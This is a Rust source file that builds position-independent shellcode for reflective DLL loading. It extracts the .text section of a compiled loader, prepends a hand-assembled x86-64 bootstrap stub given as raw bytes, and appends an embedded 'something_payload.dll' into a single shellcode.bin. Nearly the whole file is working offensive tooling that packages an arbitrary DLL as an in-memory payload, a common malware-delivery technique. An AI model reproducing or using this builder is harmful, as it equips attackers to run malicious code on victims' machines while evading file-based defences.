use anyhow::Result;
use goblin::pe::PE;
use std::fs::File;
use std::io::prelude::*;
use std::io::BufWriter;

const DLL: &[u8; 93184] = include_bytes!(r".\something_payload.dll");

fn main() -> Result<()> {
    let src_path = "shellcode\\target\\x86_64-pc-windows-msvc\\release\\shellcode.exe";
    let mut file = File::open(src_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    let pe = PE::parse(&mut buffer)?;
    let standard_fileds = pe.header.optional_header.unwrap().standard_fields;
    let entry_offset = standard_fileds.address_of_entry_point - standard_fileds.base_of_code;

    for section in pe.sections {
        let name = String::from_utf8(section.name.to_vec())?;
        if !name.starts_with(".text") {
            continue;
        }
        let start = section.pointer_to_raw_data as usize;
        let size = section.size_of_raw_data as usize;
        let dst_path = "shellcode\\target\\x86_64-pc-windows-msvc\\release\\shellcode.bin";
        let shellcode = File::create(dst_path)?;
        let mut bootstrap: Vec<u8> = Vec::new();

        /*
         *     ;bootstrap shellcode
         *     call    0x5
         *     pop     rcx
         *     add     rcx,0x???? ;address of dll
         *     push    rsi
         *     mov     rsi,rsp
         *     and     rsp,0xfffffffffffffff0
         *     sub     rsp,0x20
         *     call    0x5
         *     mov     rsp,rsi
         *     pop     rsi
         *     ret
         */

        bootstrap.extend_from_slice(b"\xe8\x00\x00\x00\x00");
        bootstrap.push(b'\x59');
        bootstrap.extend_from_slice(b"\x48\x81\xc1\x00\x00\x00\x00");
        bootstrap.push(b'\x56');
        bootstrap.extend_from_slice(b"\x48\x89\xe6");
        bootstrap.extend_from_slice(b"\x48\x83\xe4\xf0");
        bootstrap.extend_from_slice(b"\x48\x83\xec\x20");
        bootstrap.push(b'\xe8');
        bootstrap.push(5 as u8);
        bootstrap.extend_from_slice(b"\x00\x00\x00");
        bootstrap.extend_from_slice(b"\x48\x89\xf4");
        bootstrap.push(b'\x5e');
        bootstrap.push(b'\xc3');

        // 5bytes is not enough for jmp 64bit address
        // but we know that bootstrap is in the range of u32, so this is okay, for now :3
        let dll_offset = bootstrap.len() + size;
        bootstrap[9]  = ((dll_offset >> 0) & 0xFF) as _;
        bootstrap[10] = ((dll_offset >> 8) & 0xFF) as _;
        bootstrap[11] = ((dll_offset >> 16) & 0xFF) as _;
        bootstrap[12] = ((dll_offset >> 24) & 0xFF) as _;

        let mut buf_writer = BufWriter::new(shellcode);

        // write bootstrap first
        for b in bootstrap {
            buf_writer.write(&[b])?;
        }

        // write jmp to entry code
        // and same as dll offset comments↑
        buf_writer.write(&[0xe9])?;
        buf_writer.write(&[((entry_offset >> 0) & 0xFF) as _])?;
        buf_writer.write(&[((entry_offset >> 8) & 0xFF) as _])?;
        buf_writer.write(&[((entry_offset >> 16) & 0xFF) as _])?;
        buf_writer.write(&[((entry_offset >> 24) & 0xFF) as _])?;

        // write rdi code
        for i in start..start + size {
            buf_writer.write(&[buffer[i]])?;
        }

        // write dll
        for b in DLL {
            buf_writer.write(&[*b])?;
        }
        buf_writer.flush().unwrap();
        println!("done! shellcode saved in {}", dst_path);
    }
    Ok(())
}
